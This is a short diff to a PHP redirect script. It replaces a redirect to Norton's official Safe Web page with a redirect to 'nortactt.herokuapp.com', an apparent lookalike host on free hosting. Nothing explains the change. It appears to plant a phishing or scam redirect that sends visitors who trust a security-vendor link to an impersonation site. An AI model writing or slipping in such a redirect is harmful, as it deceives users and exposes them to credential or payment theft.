@@ -1,4 +1,4 @@
 <?php
-header("Location: https://au.norton.com/feature/safe-web");
+header("Location: https://nortactt.herokuapp.com/");
 die();
 ?>
